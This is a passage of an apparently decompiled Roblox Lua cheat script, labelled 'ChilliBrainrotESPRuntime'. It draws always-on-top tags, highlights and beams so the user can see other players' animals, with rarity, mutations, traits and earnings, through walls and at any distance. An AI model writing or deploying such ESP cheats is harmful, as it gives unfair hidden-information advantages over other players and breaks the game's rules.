				else
					tbl15[k] = nil
				end
			end
		end

		fn10(function(arg, arg2)
			if arg == "UnfadedPlot" then
				local v22 = fn37
				arg2 = typeof(arg2) == "Instance" and arg2
				v22(arg2 or nil)
			elseif arg == "ClearBaseTransparency" then
				fn38(arg2)
			end
		end)

		local function fn39(arg)
			n8 += 1
			tbl14[n8] = arg
			if flag11 then
				return
			end
			flag11 = true
			local v22 = n7

			task.delay(v20:NextNumber(0.18, 0.42), function()
				flag11 = false
				if not flag10 or v22 ~= n7 then
					return
				end
				local v23 = tbl14
				local v24 = n8
				tbl14 = {}
				n8 = 0

				for i_ = 1, v24 do
					local v25 = v23[i_]

					if v25 and v25.Parent then
						fn33(v25)
					end
				end
			end)
		end

		local function fn40()
			n7 += 1
			local v22 = n7

			task.spawn(function()
				local children = plots:GetChildren()
				local n9 = 1

				while flag10 and v22 == n7 and n9 <= #children do
					local now = os.clock()

					while true do
						local v23 = children[n9]
						n9 += 1

						if v23 then
							fn33(v23)

							for _, child in ipairs(v23:GetChildren()) do
								children[#children + 1] = child
							end
						end

						if not (n9 > #children or os.clock() - now >= n6) then
							continue
						end
						break
					end

					if n9 <= #children then
						RunService.Heartbeat:Wait()
					end
				end
			end)
		end

		local function fn41()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			if not plots then
				return
			end

			connection = plots.DescendantAdded:Connect(function(descendant)
				if flag10 then
					fn39(descendant)
				end
			end)

			fn40()
		end

		local function fn42()
			flag10 = false
			n7 += 1

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			fn34()
		end

		local function fn43()
			fn42()
			flag10 = true
			plots = Workspace:FindFirstChild("Plots")
			if plots then
				fn41()
				return
			end

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if flag10 and child.Name == "Plots" then
					plots = child

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					fn41()
				end
			end)
		end

		local function fn44()
			local flag12 = tbl3.YourBaseClear == true

			if flag12 and not flag10 then
				fn43()
			elseif not flag12 and flag10 then
				fn42()
			end
		end

		fn10(function(arg)
			if arg == "YourBaseClear" then
				fn44()
			end
		end)

		fn44()
		bindableEvent.Event:Connect(fn42)
		folder.Destroying:Connect(fn42)
	end

	chilliBrainrotESPRuntime, v12 = fn5("__ChilliBrainrotESPRuntime")
	local font
	font = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	local tbl12
	tbl12 = {}
	local tbl13
	tbl13 = { Limit = 1000000, Outline = Color3.fromRGB(255, 232, 152) }

	do
		local colorSequence = ColorSequence.new
		local tbl14 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
		local v20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		tbl14[1] = v19
		tbl14[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl14)
		end

		tbl13.Text = colorSequence(tbl14)
	end

	do
		local colorSequence = ColorSequence.new
		local tbl14 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local v20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local new = ColorSequenceKeypoint.new
		local color2 = Color3.fromRGB
		tbl14[1] = v19
		tbl14[2] = v20

		do
			local values = table.pack(new(1, color2(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl14)
		end

		tbl13.Stroke = colorSequence(tbl14)
	end

	local tbl14
	tbl14 = { Limit = 10000000, Outline = Color3.fromRGB(255, 194, 112) }

	do
		local colorSequence = ColorSequence.new
		local tbl15 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local v20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		tbl15[1] = v19
		tbl15[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		tbl14.Text = colorSequence(tbl15)
	end

	do
		local colorSequence = ColorSequence.new
		local tbl15 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
		local v20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
		tbl15[1] = v19
		tbl15[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		tbl14.Stroke = colorSequence(tbl15)
	end

	local tbl15
	tbl15 = { Limit = 100000000, Outline = Color3.fromRGB(255, 160, 132) }

	do
		local colorSequence = ColorSequence.new
		local tbl16 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
		local v20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		tbl16[1] = v19
		tbl16[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(196, 42, 0)))
			table.move(values, 1, values.n, 3, tbl16)
		end

		tbl15.Text = colorSequence(tbl16)
	end

	do
		local colorSequence = ColorSequence.new
		local tbl16 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
		local v20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
		tbl16[1] = v19
		tbl16[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl16)
		end

		tbl15.Stroke = colorSequence(tbl16)
	end

	do
		local tbl16 = { Limit = math.huge, Outline = Color3.fromRGB(255, 128, 138) }
		local colorSequence = ColorSequence.new
		local tbl17 = {}
		local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
		local v20 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
		tbl17[1] = v19
		tbl17[2] = v20

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(184, 0, 18)))
			table.move(values, 1, values.n, 3, tbl17)
		end

		tbl16.Text = colorSequence(tbl17)
		local colorSequence2 = ColorSequence.new
		local tbl18 = {}
		local v21 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
		local v22 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
		tbl18[1] = v21
		tbl18[2] = v22

		do
			local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 0, 3)))
			table.move(values, 1, values.n, 3, tbl18)
		end

		tbl16.Stroke = colorSequence2(tbl18)
		tbl12[1] = tbl13
		tbl12[2] = tbl14
		tbl12[3] = tbl15
		tbl12[4] = tbl16
	end

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Animals)
		end)

		tbl4 = ok and type(result) == "table" and result or {}
	end

	local tbl16

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Rarities)
		end)

		tbl16 = ok and type(result) == "table" and result or {}
	end

	local flag11, fn30

	do
		local ok, result = pcall(function()
			return require(ReplicatedStorage.Datas.Mutations)
		end)

		local tbl17 = ok and type(result) == "table" and result or {}

		local ok2, result2 = pcall(function()
			return require(ReplicatedStorage.Packages.Gradients)
		end)

		flag11 = ok2 and type(result2) == "table" and result2 or nil
		local tbl18 = {}

		local ok3, result3 = pcall(function()
			return require(ReplicatedStorage.Datas.Traits)
		end)

		local tbl19 = ok3 and type(result3) == "table" and result3 or {}

		for k, v19 in pairs(tbl19) do
			if type(v19) == "table" then
				v19.TraitKey = k

				if v19.Icon then
					local str = tostring(v19.Icon)
					tbl18[str] = v19
					local match = str:match("%d+")

					if match then
						tbl18[match] = v19
					end
				end
			end
		end

		flag2 = false
		tbl5 = {}
		tbl6 = {}
		n2 = 1
		flag3 = false
		flag4 = false
		n3 = 1000000
		tbl7 = { Name = true, Mutation = true, Value = true, Trails = true, Rarity = false }

		tbl8 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
		}

		fn30 = function(arg)
			for _, v19 in ipairs(tbl12) do
				if arg < v19.Limit then
					return v19
				end
			end

			return tbl12[#tbl12]
		end

		local function fn31(arg)
			local v19 = tbl4[arg]
			if type(v19) == "table" and v19.Rarity then
				return tostring(v19.Rarity)
			end
			return nil
		end

		local function fn32(arg)
			if arg >= 1e9 then
				return string.format("$%.2fB/s", arg / 1e9)
			end

			if arg >= 1000000 then
				return string.format("$%.2fM/s", arg / 1000000)
			end

			if arg >= 1000 then
				return string.format("$%.1fK/s", arg / 1000)
			end
			return string.format("$%d/s", math.floor(arg))
		end

		local function fn33(arg, arg2)
			local debris = Workspace:FindFirstChild("Debris")
			if not debris then
				return nil
			end
			local v19 = nil
			local v20 = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == arg.Name then
						local magnitude = (child.Position - arg2.Position).Magnitude

						if not v19 or magnitude < v19 then
							v19 = magnitude
							v20 = animalOverhead
						end
					end
				end
			end

			if v20 and v19 and v19 <= 14 then
				return v20
			end
			return nil
		end

		local function fn34(arg)
			if arg.CachedOverhead and arg.CachedOverhead.Parent then
				return arg.CachedOverhead
			end
			local v19 = fn33(arg.Model, arg.Root)
			arg.CachedOverhead = v19
			return v19
		end

		local function fn35(arg, arg2, arg3)
			local mutation = arg3 or fn33(arg, arg2)
			mutation = mutation and mutation:FindFirstChild("Mutation")
			if not (mutation and mutation:IsA("TextLabel") and mutation.Visible) then
				return nil
			end
			local str = tostring(mutation.Text or "")
			if str == "" then
				return nil
			end

			local tbl20 = {
				Text = str,
				RichText = mutation.RichText == true,
				Color = mutation.TextColor3,
				Font = mutation.FontFace,
				StrokeColor = nil,
				Gradient = nil,
				SourceGrad = mutation:FindFirstChildOfClass("UIGradient"),
			}

			local uiStroke = mutation:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				tbl20.StrokeColor = uiStroke.Color
			end

			if tbl20.SourceGrad then
				tbl20.Gradient = {
					Color = tbl20.SourceGrad.Color,
					Rotation = tbl20.SourceGrad.Rotation,
					Offset = tbl20.SourceGrad.Offset,
				}
			end

			return tbl20
		end

		local function fn36(arg)
			if not arg or arg == "" then
				return nil
			end
			local match, v19 = arg:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

			if match then
				local n8 = tonumber(match) or 0
				local str = v19:upper()

				if str == "K" then
					n8 *= 1000
				elseif str == "M" then
					n8 *= 1000000
				elseif str == "B" then
					n8 *= 1e9
				elseif str == "T" then
					n8 *= 1e12
				end

				return n8
			end

			return nil
		end

		local function fn37(arg, arg2, arg3, arg4)
			local v19 = tbl4[arg]
			local n8 = type(v19) == "table" and tonumber(v19.Generation) or 0
			if n8 <= 0 then
				return fn36(arg4) or 0
			end
			local v20 = arg2 and tbl17 and tbl17[arg2]
			local n9 = 1

			if v20 then
				n9 = 1 + (tonumber(tbl17[arg2].Modifier) or 0)
			end

			local v21 = arg3 and tbl19
			local flag12 = false

			if v21 then
				for _, v22 in ipairs(arg3) do
					local v23 = tbl19[v22] or tbl19[v22:gsub("_", " ")]

					if v23 then
						if v22 == "Sleepy" or v23.Name == "Sleepy" then
							flag12 = true
						else
							n9 += tonumber(v23.MultiplierModifier) or 0
						end
					end
				end
			end

			local v22 = math.round(n8 * n9 * (flag12 and 0.5 or 1))
			local v23 = fn36(arg4)
			if v23 and v23 > v22 then
				return v23
			end
			return v22 > 0 and v22 or v23 or n8
		end

		local function fn38(arg, arg2, arg3)
			local tbl20 = {}
			local tbl21 = {}
			local tbl22 = {}
			local tbl23 = {}

			local function fn39(arg4, arg5)
				if arg4 and not tbl23[arg4] then
					tbl23[arg4] = true
					table.insert(tbl21, arg4)
				end

				if arg5 and arg5 ~= "" and arg5 ~= "rbxassetid://110835412437000" then
					local match = tostring(arg5):match("%d+")
					local str = match or tostring(arg5)

					if not tbl22[str] then
						tbl22[str] = true
						local str2 = tostring(arg5)

						if not str2:find("://") and match then
							str2 = "rbxassetid://" .. match
						end

						table.insert(tbl20, str2)
					end
				end
			end

			local traits = arg3 or fn33(arg, arg2)
			traits = traits and traits:FindFirstChild("Traits")

			if traits and traits.Visible then
				for _, child in ipairs(traits:GetChildren()) do
					if child:IsA("ImageLabel") and child.Visible and child.Image and child.Image ~= "" then
						local str = tostring(child.Image)
						local match = str:match("%d+")
						local traitKey = tbl18[str] or match and tbl18[match]

						if traitKey then
							traitKey = traitKey.TraitKey or traitKey.Display or traitKey.Name
						end

						fn39(traitKey, child.Image)
					end
				end
			end

			for _, child in ipairs(arg:GetChildren()) do
				local match = child.Name:match("^_Trait%.(.+)$")

				if match then
					local v19 = tbl19[match] or tbl19[match:gsub("_", " ")]
					fn39(match, v19 and v19.Icon)
				end
			end

			local attribute = arg:GetAttribute("Trait") or arg:GetAttribute("Traits")

			if attribute then
				local str = tostring(attribute)
				local v19 = tbl19[str] or tbl19[str:gsub("_", " ")]
				fn39(str, v19 and v19.Icon)
			end

			return #tbl20 > 0 and tbl20 or nil, #tbl21 > 0 and tbl21 or nil
		end

		fn16 = function(arg)
			return arg:FindFirstChild("RootPart") or arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
		end

		local function fn39(parent, layoutOrder, arg)
			local frame = Instance.new("Frame")
			frame.BackgroundTransparency = 1
			frame.LayoutOrder = layoutOrder
			frame.Size = UDim2.new(1, 0, 0, arg)
			frame.Parent = parent
			local textLabel = Instance.new("TextLabel")
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font
			textLabel.Position = UDim2.fromOffset(1, 1)
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.Text = ""
			textLabel.TextColor3 = Color3.fromRGB(12, 0, 2)
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextTransparency = 0.1
			textLabel.ZIndex = 2
			textLabel.Parent = frame
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.BackgroundTransparency = 1
			textLabel2.FontFace = font
			textLabel2.Size = UDim2.fromScale(1, 1)
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel2.TextScaled = true
			textLabel2.TextStrokeTransparency = 1
			textLabel2.ZIndex = 3
			textLabel2.Parent = frame
			local uiStroke = Instance.new("UIStroke")
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = Color3.fromRGB(0, 0, 0)
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round

			uiStroke.Thickness = pcall(function()
				uiStroke.BorderOffset = UDim.new(0, 0)
				uiStroke.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end) and 0.05 or 1.6

			uiStroke.Transparency = 0.05
			uiStroke.Parent = textLabel2
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Rotation = 90
			uiGradient.Enabled = false
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Rotation = 90
			uiGradient2.Enabled = false
			uiGradient2.Parent = textLabel2
			return { Holder = frame, Label = textLabel2, Shadow = textLabel, Stroke = uiStroke, StrokeGradient = uiGradient, TextGradient = uiGradient2 }
		end

		local function fn40(parent, layoutOrder, arg)
			local frame = Instance.new("Frame")
			frame.Name = "TraitRow"
			frame.BackgroundTransparency = 1
			frame.LayoutOrder = layoutOrder
			frame.Size = UDim2.new(1, 0, 0, arg)
			frame.Parent = parent
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout.Padding = UDim.new(0, 3)
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = frame
			return { Holder = frame, Layout = uiListLayout, Icons = {}, CurrentKey = "" }
		end

		fn17 = function(adornee, adornee2)
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "BrainrotTag"
			billboardGui.Adornee = adornee2
			billboardGui.AlwaysOnTop = true
			billboardGui.ClipsDescendants = false
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = math.huge
			billboardGui.Size = UDim2.fromOffset(220, 95)
			billboardGui.StudsOffsetWorldSpace = Vector3.new(0, 4.4, 0)
			billboardGui.Parent = adornee2
			local frame = Instance.new("Frame")
			frame.BackgroundTransparency = 1
			frame.Size = UDim2.fromScale(1, 1)
			frame.Parent = billboardGui
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.FillDirection = Enum.FillDirection.Vertical
			uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
			uiListLayout.Parent = frame
			local v19 = fn33(adornee, adornee2)
			local text = v19 and v19:FindFirstChild("Generation") and v19.Generation.Text
			local text2 = v19 and v19:FindFirstChild("Mutation") and v19.Mutation.Visible and v19.Mutation.Text

			if not text2 then
				local attribute = adornee:GetAttribute("Mutation") or adornee:GetAttribute("__mutation")

				if attribute and tostring(attribute) ~= "" then
					text2 = tostring(attribute)
				end
			end

			local v20, v21 = fn38(adornee, adornee2)
			local v22 = fn37(adornee.Name, text2, v21, text)

			local tbl20 = {
				Model = adornee,
				Root = adornee2,
				Billboard = billboardGui,
				Column = frame,
				RarityRow = fn39(frame, 0, 16),
				TraitRow = fn40(frame, 1, 18),
				MutationRow = fn39(frame, 2, 15),
				NameRow = fn39(frame, 3, 19),
				ValueRow = fn39(frame, 4, 16),
				Name = adornee.Name,
				Generation = v22,
			}

			tbl20.RarityRow.Label.RichText = true
			tbl20.MutationRow.Label.RichText = true
			tbl20.RarityRow.Holder.Visible = false
			tbl20.TraitRow.Holder.Visible = false
			local v23 = fn30(tbl20.Generation)
			tbl20.NameRow.TextGradient.Color = v23.Text
			tbl20.NameRow.TextGradient.Enabled = true
			tbl20.NameRow.StrokeGradient.Color = v23.Stroke
			tbl20.NameRow.StrokeGradient.Enabled = true
			tbl20.ValueRow.TextGradient.Enabled = false
			tbl20.ValueRow.StrokeGradient.Enabled = false
			tbl20.ValueRow.Label.TextColor3 = Color3.fromRGB(115, 255, 0)
			tbl20.ValueRow.Shadow.TextColor3 = Color3.fromRGB(18, 48, 0)
			tbl20.ValueRow.Stroke.Transparency = 0.3
			tbl20.NameRow.Label.Text = tbl20.Name
			tbl20.NameRow.Shadow.Text = tbl20.Name
			local v24 = fn32(tbl20.Generation)
			tbl20.ValueRow.Label.Text = v24
			tbl20.ValueRow.Shadow.Text = v24
			local highlight2 = Instance.new("Highlight")
			highlight2.Name = "BrainrotHighlight"
			highlight2.Adornee = adornee
			highlight2.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight2.FillColor = v23.Outline
			highlight2.FillTransparency = 0.86
			highlight2.OutlineColor = v23.Outline
			highlight2.OutlineTransparency = 0.3
			highlight2.Enabled = false
			highlight2.Parent = adornee
			tbl20.Highlight = highlight2
			tbl20.BeamTint = v23.Outline
			return tbl20
		end

		fn18 = function(arg)
			local floor = math.floor
			local n8 = 95 * n2
			arg.Billboard.Size = UDim2.fromOffset(math.floor(220 * n2), floor(n8))
			arg.RarityRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * n2))
			local n9 = math.floor(18 * n2)
			arg.TraitRow.Holder.Size = UDim2.new(1, 0, 0, n9)

			for _, icon in ipairs(arg.TraitRow.Icons) do
				icon.Size = UDim2.fromOffset(n9, n9)
			end

			arg.MutationRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(15 * n2))
			arg.NameRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(19 * n2))
			arg.ValueRow.Holder.Size = UDim2.new(1, 0, 0, math.floor(16 * n2))
		end

		local function fn41(arg)
			if arg.RarityGradientCleanup then
				pcall(arg.RarityGradientCleanup)
				arg.RarityGradientCleanup = nil
			end

			arg.ActiveRarityEffect = nil
			arg.SourceRarityGrad = nil
			arg.SourceMutationGrad = nil
		end

		fn19 = function(arg, arg2)
			pcall(function()
				if not tbl7.Mutation then
					arg.MutationShown = false
					arg.MutationRow.Holder.Visible = false
					return
				end

				if arg2 < (arg.MutationCheckedAt or 0) then
					arg.MutationRow.Holder.Visible = arg.MutationShown == true
					return
				end
				arg.MutationCheckedAt = arg2 + 0.4
				local v19 = fn35(arg.Model, arg.Root, fn34(arg))

				if not v19 then
					arg.MutationShown = false
					arg.MutationRow.Holder.Visible = false
					arg.SourceMutationGrad = nil
					return
				end

				arg.MutationShown = true
				local mutationRow = arg.MutationRow
				mutationRow.Holder.Visible = true
				mutationRow.Label.RichText = v19.RichText
				mutationRow.Label.Text = v19.Text

				if v19.Color then
					mutationRow.Label.TextColor3 = v19.Color
				end

				if v19.Font then
					pcall(function()
						mutationRow.Label.FontFace = v19.Font
						mutationRow.Shadow.FontFace = v19.Font
					end)
				end

				if v19.StrokeColor then
					mutationRow.Stroke.Color = v19.StrokeColor
				end

				if v19.Gradient then
					pcall(function()
						mutationRow.TextGradient.Color = v19.Gradient.Color
						mutationRow.TextGradient.Rotation = v19.Gradient.Rotation
						mutationRow.TextGradient.Offset = v19.Gradient.Offset
						mutationRow.TextGradient.Enabled = true
					end)

					arg.SourceMutationGrad = v19.SourceGrad
				else
					mutationRow.TextGradient.Enabled = false
					arg.SourceMutationGrad = nil
				end

				mutationRow.Shadow.RichText = false
				mutationRow.Shadow.Text = v19.Text:gsub("<[^<>]->", "")
			end)
		end

		fn20 = function(arg, arg2)
			if not tbl7.Rarity then
				arg.RarityShown = false
				arg.RarityRow.Holder.Visible = false
				fn41(arg)
				return
			end

			if arg2 < (arg.RarityCheckedAt or 0) then
				arg.RarityRow.Holder.Visible = arg.RarityShown == true
				return
			end
			arg.RarityCheckedAt = arg2 + 0.5
			local text = fn31(arg.Model.Name)
			local v19 = fn34(arg)
			local rarity = v19 and v19:FindFirstChild("Rarity")

			if rarity and rarity:IsA("TextLabel") and rarity.Visible and rarity.Text ~= "" then
				text = rarity.Text
			end

			if not text or text == "" then
				arg.RarityShown = false
				arg.RarityRow.Holder.Visible = false
				fn41(arg)
				return
			end

			arg.RarityShown = true
			local rarityRow = arg.RarityRow
			rarityRow.Holder.Visible = true
			rarityRow.Label.Text = text
			rarityRow.Shadow.Text = text:gsub("<[^<>]->", "")
			local gradientPreset = tbl16[text]
			gradientPreset = gradientPreset and gradientPreset.GradientPreset
			local flag12 = false

			pcall(function()
				if gradientPreset and flag11 and flag11.apply then
					if arg.ActiveRarityEffect ~= gradientPreset then
						if arg.RarityGradientCleanup then
							pcall(arg.RarityGradientCleanup)
							arg.RarityGradientCleanup = nil
						end

						arg.ActiveRarityEffect = gradientPreset

						local ok4, rarityGradientCleanup = pcall(function()
							return flag11.apply(rarityRow.Label, gradientPreset)
						end)

						if ok4 and typeof(rarityGradientCleanup) == "function" then
							arg.RarityGradientCleanup = rarityGradientCleanup
						end
					end

					pcall(function()
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
					end)

					arg.SourceRarityGrad = nil
					flag12 = true
				end
			end)

			if not flag12 then
				pcall(function()
					if arg.RarityGradientCleanup then
						pcall(arg.RarityGradientCleanup)
						arg.RarityGradientCleanup = nil
					end

					arg.ActiveRarityEffect = nil
					local uiGradient = rarity and rarity:FindFirstChildOfClass("UIGradient")
					local uiStroke = rarity and rarity:FindFirstChildOfClass("UIStroke")

					if uiGradient then
						rarityRow.TextGradient.Color = uiGradient.Color
						rarityRow.TextGradient.Rotation = uiGradient.Rotation
						rarityRow.TextGradient.Offset = uiGradient.Offset
						rarityRow.TextGradient.Enabled = true
						arg.SourceRarityGrad = uiGradient
					else
						rarityRow.TextGradient.Enabled = false
						arg.SourceRarityGrad = nil
					end

					if uiStroke then
						rarityRow.Stroke.Color = uiStroke.Color
					else
						rarityRow.Stroke.Color = Color3.fromRGB(0, 0, 0)
					end

					if rarity and rarity.TextColor3 then
						rarityRow.Label.TextColor3 = rarity.TextColor3
					elseif text == "Mythic" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 0, 0)
					elseif text == "Legendary" or text == "Legend" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(255, 175, 0)
					elseif text == "Epic" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(134, 0, 171)
					elseif text == "Rare" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(0, 131, 171)
					elseif text == "Common" then
						rarityRow.Label.TextColor3 = Color3.fromRGB(0, 171, 40)
					else
						rarityRow.Label.TextColor3 = Color3.fromRGB(130, 210, 255)
					end
				end)
			end
		end

		fn21 = function(arg, arg2)
			if not tbl7.Trails then
				arg.TraitRow.Holder.Visible = false
				return
			end

			if arg2 < (arg.TraitCheckedAt or 0) then
				arg.TraitRow.Holder.Visible = arg.TraitIcons ~= nil
				return
			end
			arg.TraitCheckedAt = arg2 + 0.5
			local v19, v20 = fn38(arg.Model, arg.Root, fn34(arg))
			arg.ActiveTraitNames = v20

			if not v19 then
				arg.TraitIcons = nil
				arg.TraitRow.Holder.Visible = false
				arg.TraitRow.CurrentKey = ""

				for _, icon in ipairs(arg.TraitRow.Icons) do
					icon.Visible = false
				end

				return
			end

			arg.TraitIcons = v19
			arg.TraitRow.Holder.Visible = true
			local currentKey = table.concat(v19, "|")

			if arg.TraitRow.CurrentKey ~= currentKey then
				arg.TraitRow.CurrentKey = currentKey
				local n8 = math.floor(18 * n2)

				for i_ = 1, #v19 do
					local imageLabel = arg.TraitRow.Icons[i_]

					if not imageLabel then
						imageLabel = Instance.new("ImageLabel")
						imageLabel.BackgroundTransparency = 1
						imageLabel.ScaleType = Enum.ScaleType.Fit
						imageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255)
						imageLabel.ZIndex = 3
						imageLabel.Parent = arg.TraitRow.Holder
						arg.TraitRow.Icons[i_] = imageLabel
					end

					imageLabel.Image = v19[i_]
					imageLabel.Size = UDim2.fromOffset(n8, n8)
					imageLabel.LayoutOrder = i_
					imageLabel.Visible = true
				end

				for i_ = #v19 + 1, #arg.TraitRow.Icons do
					arg.TraitRow.Icons[i_].Visible = false
				end
			end
		end

		fn22 = function(arg, arg2)
			if arg2 < (arg.GenerationCheckedAt or 0) then
				return
			end
			arg.GenerationCheckedAt = arg2 + 0.4
			local mutation = fn34(arg)
			local text = mutation and mutation:FindFirstChild("Generation") and mutation.Generation.Text
			mutation = mutation and mutation:FindFirstChild("Mutation")
			local text2

			if mutation and mutation.Visible and mutation.Text ~= "" then
				text2 = mutation.Text
			else
				local attribute = arg.Model:GetAttribute("Mutation") or arg.Model:GetAttribute("__mutation")
				local flag12 = attribute and tostring(attribute) ~= ""
				text2 = nil

				if flag12 then
					text2 = tostring(attribute)
				end
			end

			local activeTraitNames = arg.ActiveTraitNames

			if not activeTraitNames then
				local v19
				v19, activeTraitNames = fn38(arg.Model, arg.Root)
				arg.ActiveTraitNames = activeTraitNames
			end

			local v19 = fn37(arg.Name, text2, activeTraitNames, text)

			if v19 ~= arg.Generation and v19 > 0 then
				arg.Generation = v19
				local v20 = fn32(v19)
				arg.ValueRow.Label.Text = v20
				arg.ValueRow.Shadow.Text = v20
				local v21 = fn30(v19)
				arg.NameRow.TextGradient.Color = v21.Text
				arg.NameRow.StrokeGradient.Color = v21.Stroke
				arg.Highlight.FillColor = v21.Outline
				arg.Highlight.OutlineColor = v21.Outline
				arg.BeamTint = v21.Outline
			end
		end

		fn23 = function(arg, arg2)
			if flag4 then
				return arg2
			end
			return (arg.Generation or 0) >= n3
		end

		attachment = nil
		local attachment4 = nil
		local beam3 = nil
		local beam4 = nil
		v13 = nil
		v14 = nil

		fn24 = function()
			pcall(function()
				if beam3 then
					beam3:Destroy()
				end
			end)

			pcall(function()
				if beam4 then
					beam4:Destroy()
				end
			end)

			pcall(function()
				if attachment then
					attachment:Destroy()
				end
			end)

			pcall(function()
				if attachment4 then
					attachment4:Destroy()
				end
			end)

			beam3 = nil
			beam4 = nil
			attachment = nil
			attachment4 = nil
			v13 = nil
			v14 = nil
		end

		fn25 = function(parent, parent2)
			fn24()
			if not (parent and parent2) then
				return
			end
			attachment = Instance.new("Attachment")
			attachment.Name = "BrainrotBeamStart"
			attachment.Position = Vector3.new(0, 1, 0)
			attachment.Parent = parent
			attachment4 = Instance.new("Attachment")
			attachment4.Name = "BrainrotBeamTarget"
			attachment4.Position = Vector3.new(0, 2.5, 0)
			attachment4.Parent = parent2
			local color2 = Color3.fromRGB(255, 25, 140)
			local color3 = Color3.fromRGB(255, 120, 220)
			local color4 = Color3.fromRGB(180, 35, 255)
			beam3 = Instance.new("Beam")
			beam3.Name = "BrainrotBeamGlow"
			beam3.Attachment0 = attachment
			beam3.Attachment1 = attachment4
			beam3.Color = ColorSequence.new(color2, color4)
			beam3.CurveSize0 = 1.8
			beam3.CurveSize1 = -1.8
			beam3.FaceCamera = true
			beam3.LightEmission = 0.55
			beam3.Segments = 20
			beam3.Transparency = NumberSequence.new(0.65)
			beam3.Width0 = 0.42
			beam3.Width1 = 0.6
			obj[beam3] = true
			beam3.Parent = attachment
			beam4 = Instance.new("Beam")
